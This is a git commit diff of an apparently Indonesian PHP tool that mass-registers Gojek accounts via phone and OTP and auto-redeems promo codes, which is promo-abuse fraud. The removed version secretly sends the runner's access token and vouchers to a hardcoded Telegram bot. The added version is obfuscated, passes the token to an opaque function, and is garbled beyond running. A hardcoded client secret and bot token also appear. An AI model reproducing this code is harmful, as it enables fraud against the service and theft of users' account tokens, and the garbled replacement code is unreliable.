a534082d839b0ae9f86597c9d4791ab809a4229e
submateam <61092073+submateam@users.noreply.github.com>
2020-03-18 01:26:23 +0700

    subma3

--- subma3.php
+++ subma3.php
@@ -1,171 +1,47 @@
-<?php
-date_default_timezone_set('Asia/Jakarta');
-include "function.php";
-echo color("green"," =================================== \n");
-echo color("green"," Claim Voucher \n");
-echo color("green"," Auto Create & Redeem Voucher \n");
-echo color("green"," =================================== \n");
-echo " Created by : Vey \n";
-echo " Version    : 555 \n";
-echo " Time       : ".date('d-m-Y||H:i:s')." \n";
-echo color("green"," =================================== \n");
-
-//	function change(){
-        $nama = nama();
-        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
-        ulang:
-        echo color("nevy","?] Number : ");
-        // $no = trim(fgets(STDIN));
-        $nohp = trim(fgets(STDIN));
-        $nohp = str_replace("62","62",$nohp);
-        $nohp = str_replace("(","",$nohp);
-        $nohp = str_replace(")","",$nohp);
-        $nohp = str_replace("-","",$nohp);
-        $nohp = str_replace(" ","",$nohp);
-
-        if (!preg_match('/[^+0-9]/', trim($nohp))) {
-            if (substr(trim($nohp),0,3)=='62') {
-                $hp = trim($nohp);
-            }
-            else if (substr(trim($nohp),0,1)=='0') {
-                $hp = '62'.substr(trim($nohp),1);
-			}
-			else if(substr(trim($nohp), 0, 2)=='62'){
-				$hp = '6'.substr(trim($nohp), 1);
-			}
-			else{
-				$hp = '1'.substr(trim($nohp),0,13);
-			}
-		}
-		
-		$data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
-        $register = request("/v5/customers", null, $data);
-        if(strpos($register, '"otp_token"')){
-			$otptoken = getStr('"otp_token":"','"',$register);
-			echo color("green","+] Verification code has been sent")."\n";
-			otp:
-			echo color("nevy","?] OTP : ");
-			$otp = trim(fgets(STDIN));
-			$data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
-			$verif = request("/v5/customers/phone/verify", null, $data1);
-			if(strpos($verif, '"access_token"')){
-				echo color("green","+] Register Success\n");
-				$token = getStr('"access_token":"','"',$verif);
-				$uuid = getStr('"resource_owner_id":',',',$verif);
-				echo color("green","+] Your access token : ".$token."\n\n");
-				save("token.txt",$token);
-				
-				echo color("green","\n===========(REDEEM VOUCHER)===========");
-				echo "\n".color("yellow","!] Claim Voc COBAGOCAR");
-				echo "\n".color("yellow","!] Please wait...");
-				for($a=1;$a<=3;$a++){
-					echo color("yellow",".");
-					sleep(1);
-				}
-				$code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOCAR"}');
-				$message = fetch_value($code1,'"message":"','"');
-				if(strpos($code1, 'You can use this promo now...')){
-					echo "\n".color("green","+] Message: ".$message);
-					goto goride;
-				}else{
-					echo "\n".color("red","-] Message: ".$message);
-					
-					echo "\n".color("yellow","!] Claim Voc GOFOOD022620A");
-					echo "\n".color("yellow","!] Please wait...");
-					for($a=1;$a<=3;$a++){
-						echo color("yellow",".");
-						sleep(1);
-					}
-					sleep(3);
-					$boba10 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOOD022620A"}');
-					$messageboba10 = fetch_value($boba10,'"message":"','"');
-					if(strpos($boba10, 'You can use this promo now...')){
-						echo "\n".color("green","+] Message: ".$messageboba10);
-						goto goride;
-					}else{
-						echo "\n".color("red","-] Message: ".$messageboba10);
-					}
-					goride:
-					echo "\n".color("yellow","!] Claim Voc COBAGORIDE");
-					echo "\n".color("yellow","!] Please wait...");
-					for($a=1;$a<=3;$a++){
-						echo color("yellow",".");
-						sleep(1);
-					}
-					sleep(3);
-					$goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGORIDE"}');
-					$message1 = fetch_value($goride,'"message":"','"');
-					echo "\n".color("green","+] Message: ".$message1);
-							
-					echo "\n".color("yellow","!] Claim Voc BELANJAINAJA");
-					echo "\n".color("yellow","!] Please wait...");
-					for($a=1;$a<=3;$a++){
-						echo color("yellow",".");
-						sleep(1);
-					}
-					sleep(3);
-					$goride1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"BELANJAINAJA"}');
-					$message2 = fetch_value($goride1,'"message":"','"');
-					echo "\n".color("green","+] Message: ".$message2);
-					sleep(3);
-					
-					$cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
-					$total = fetch_value($cekvoucher,'"total_vouchers":',',');
-					$voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
-					$voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
-					$voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
-					$voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
-					$voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
-					$voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
-					$voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
-					echo "\n".color("yellow","-> Total voucher ".$total." : ");
-					echo "\n".color("green","1. ".$voucher1);
-					echo "\n".color("green","2. ".$voucher2);
-					echo "\n".color("green","3. ".$voucher3);
-					echo "\n".color("green","4. ".$voucher4);
-					echo "\n".color("green","5. ".$voucher5);
-					echo "\n".color("green","6. ".$voucher6);
-					echo "\n".color("green","7. ".$voucher7);
-					echo"\n";
-					$expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
-					$expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
-					$expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
-					$expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
-					$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
-					$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
-					$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
-					$TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
-					$chatid = "785784404";
-					$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
-					$method	= "sendMessage";
-					$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
-					$post = ['chat_id' => $chatid, 'text' => $pesan];
-					$header = ["X-Requested-With: XMLHttpRequest",
-						"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"];
-					$ch = curl_init();
-						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-						curl_setopt($ch, CURLOPT_URL, $url);
-						curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
-						curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
-						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-					$datas = curl_exec($ch);
-					$error = curl_error($ch);
-					$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-						curl_close($ch);
-					$debug['text'] = $pesan;
-					$debug['respon'] = json_decode($datas, true);
-				}
-			}else{
-				echo color("red","-] The code you entered is incorrect");
-				echo color("green", "\n =================================== \n\n");
-				echo color("yellow","!] Please input again \n");
-				goto otp;
-            }
-		}else{
-			echo color("red","-] This number already registered");
-			echo color("green", "\n =================================== \n\n");
-			echo color("yellow","!] Please register again using other number \n");
-			goto ulang;
-        }
-//	}
-// echo change()."\n";
+date_default_timezone_set(Asia/Jakarta);includefunction.php;echoe[1;31m ================ Auto Regist & Claim voucher ===============
+;echoe[1;33m ===================== Recoded by GRE========================
+;echoe[1;32m ====================== DO SOMETHING ========================
+;$re_594eba1f=ty_594eba1f();$am_e7927c74=str_replace( '',$re_594eba1f).mt_rand(100,999);ulang:echo bk_665648e9(blueNomor : );$am_441743a2=trim(fgets(STDIN));$am_441743a2=str_replace(6262$am_441743a2);$am_441743a2=str_replace(('',$am_441743a2);$am_441743a2=str_replace()'',$am_441743a2);$am_441743a2=str_replace(-'',$am_441743a2);$am_441743a2=str_replace( '',$am_441743a2);if(!preg_match(/[^+0-9]/trim($am_441743a2))){if(substr(trim($am_441743a2),0,3)==62){$wi_bcf8826c=trim($am_441743a2);}else if(substr(trim($am_441743a2),0,1)==0){$wi_bcf8826c=62.substr(trim($am_441743a2),1);}elseif(substr(trim($am_441743a2),0,2)==62){$wi_bcf8826c=6.substr(trim($am_441743a2),1);}else{$wi_bcf8826c=1.substr(trim($am_441743a2),0,13);}}$ss_adf3f363={"email":".$am_e7927c74.@gmail.com","name":".$re_594eba1f.","phone":"+.$wi_bcf8826c.","signed_up_country":"ID"};$mu_5ff94014=by_3b978f9f(/v5/customersnull,$ss_adf3f363);if(strpos($mu_5ff94014,"otp_token")){$pf_e6f9c2a1=bp_8a1e6dbc("otp_token":""$mu_5ff94014);echo bk_665648e9(nevyKode OTP sudah dikirim).
+;echo bk_665648e9(purple(!)jika otp tidak masuk ,lakukan ulang                            ctrl+c lalu php gooo.php).
+;otp:echo bk_665648e9(redMasukkan Kode OTP : );$xl_a79c98c1=trim(fgets(STDIN));$tv_57ca2ca6={"client_name":"gojek:cons:android","data":{"otp":".$xl_a79c98c1.","otp_token":".$pf_e6f9c2a1."},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"};$tw_fbd34dfe=by_3b978f9f(/v5/customers/phone/verifynull,$tv_57ca2ca6);if(strpos($tw_fbd34dfe,"access_token")){echo 
+;echo bk_665648e9(greenSuccessfully Registered
+);$tl_5f37a13b=bp_8a1e6dbc("access_token":""$tw_fbd34dfe);$gz_d17f50a6=bp_8a1e6dbc("resource_owner_id":,$tw_fbd34dfe);echo bk_665648e9(yellowYour Access Token : .$tl_5f37a13b.
+);pm_6b63b6f0($tl_5f37a13b);oc_55663ade(tokeken-1.txt$tl_5f37a13b);echo 
+;echo bk_665648e9(green=========== INFORMASI AKUN ===========);echo 
+;echo bk_665648e9(blueEmail : .$am_e7927c74.@gmail.com);echo 
+;echo bk_665648e9(nevyName : .$re_594eba1f.
+);echo bk_665648e9(purpleNomor : +.$wi_bcf8826c.
+);echo 
+.bk_665648e9(redTRY TO REDEEM);echo 
+.bk_665648e9(yellowPlease wait);for($rc_e8b7be43=1;$rc_e8b7be43<=3;$rc_e8b7be43++){echo bk_665648e9(yellow.);sleep(1);$hu_d72246ef=by_3b978f9f(/go-promotions/v1/promotions/enrollments$tl_5f37a13b,{"promo_code":"GOPAYKIRIMPAKET"});$rl_a2bc5598=rs_89d700ab($hu_d72246ef,"message":"");if(strpos($hu_d72246ef,Promo kamu sudah bisa dipakai.)){echo 
+.bk_665648e9(green(+) Message: .$rl_a2bc5598);goto goride;}else{echo 
+.bk_665648e9(green(+) Message: .$rl_a2bc5598);goride:echo 
+;echo 
+.bk_665648e9(blue TRY TO REDEEM GF 30k);echo 
+.bk_665648e9(nevyKalo gagal , Claim Manual );echo 
+.bk_665648e9(purplePlease wait);for($rc_e8b7be43=1;$rc_e8b7be43<=3;$rc_e8b7be43++){echo bk_665648e9(purple.);sleep(1);}sleep(3);$hv_528dd11=by_3b978f9f(/go-promotions/v1/promotions/enrollments$tl_5f37a13b,{"promo_code":"COBAGOFOOD090320A"});$dj_43d03e2a=rs_89d700ab($hv_528dd11,"message":"");echo 
+.bk_665648e9(red(+) Message: .$dj_43d03e2a);echo 
+;echo 
+.bk_665648e9(yellow TRY TO REDEEM GF 30k V2);echo 
+.bk_665648e9(greenKalo gagal , Claim Manual );echo 
+.bk_665648e9(bluePlease wait);for($rc_e8b7be43=1;$rc_e8b7be43<=3;$rc_e8b7be43++){echo bk_665648e9(blue.);sleep(1);}sleep(3);$hi_e969e798=by_3b978f9f(/go-promotions/v1/promotions/enrollments$tl_5f37a13b,{"promo_code":"GOFOODLAGI090320A"});$qf_dad96f90=rs_89d700ab($hi_e969e798,"message":"");echo 
+.bk_665648e9(nevy(+) Message: .$qf_dad96f90);sleep(3);$ti_ccd1d5a5=by_3b978f9f(/gopoints/v3/wallet/vouchers?limit=10&page=1$tl_5f37a13b);$wb_c22fe15e=rs_89d700ab($ti_ccd1d5a5,"total_vouchers":,);$nj_e5c946d8=hg_41810e7d("title":"",$ti_ccd1d5a5,3);$ij_bc727f4=hg_41810e7d("title":"",$ti_ccd1d5a5,1);$fb_92ce764e=hg_41810e7d("title":"",$ti_ccd1d5a5,2);$pq_7badd37b=hg_41810e7d("title":"",$ti_ccd1d5a5,4);$op_caae3ed=hg_41810e7d("title":"",$ti_ccd1d5a5,5);$ij_95a3b257=hg_41810e7d("title":"",$ti_ccd1d5a5,6);$fa_e2a482c1=hg_41810e7d("title":"",$ti_ccd1d5a5,7);$xw_721b9f50=hg_41810e7d("title":"",$ti_ccd1d5a5,8);$ss_51cafc6=hg_41810e7d("title":"",$ti_ccd1d5a5,9);$aq_4e002e03=hg_41810e7d("title":"",$ti_ccd1d5a5,10);$cy_39071e95=hg_41810e7d("title":"",$ti_ccd1d5a5,11);echo 
+;echo 
+.bk_665648e9(purpleTotal Voucher .$wb_c22fe15e. : );echo bk_665648e9(green1. .$ij_bc727f4);echo 
+.bk_665648e9(red                     2. .$fb_92ce764e);echo 
+.bk_665648e9(yellow                     3. .$nj_e5c946d8);echo 
+.bk_665648e9(green                     4. .$pq_7badd37b);echo 
+.bk_665648e9(blue                     5. .$op_caae3ed);echo 
+.bk_665648e9(nevy                     6. .$ij_95a3b257);echo 
+.bk_665648e9(purple                     7. .$fa_e2a482c1);echo 
+.bk_665648e9(red                     8. .$xw_721b9f50);echo 
+.bk_665648e9(yellow                     9. .$ss_51cafc6);echo 
+.bk_665648e9(green                     10. .$aq_4e002e03);echo 
+.bk_665648e9(blue                     11. .$cy_39071e95);echo
+;$jz_62cb3842=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,1);$ko_fbc269f8=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,2);$cq_8cc5596e=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,3);$zj_12a1cccd=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,4);$sk_65a6fc5b=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,5);$bm_fcafade1=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,6);$cz_8ba89d77=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,7);$nv_1b1780e6=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,8);$tq_6c10b070=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,9);$ti_6c6b34a5=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,10);$bc_1b6c0433=hg_41810e7d("expiry_date":""$ti_ccd1d5a5,11);}}}else{echo bk_665648e9(red[x]Otp yang anda input salah);echo
+==================================
+;echo bk_665648e9(yellowSilahkan input kembali !
+);goto otp;}}else{echo bk_665648e9(red[x]Nomor sudah teregistrasi);echo
+==================================
+;echo bk_665648e9(yellowSilahkan registrasi kembali
+);goto ulang;}
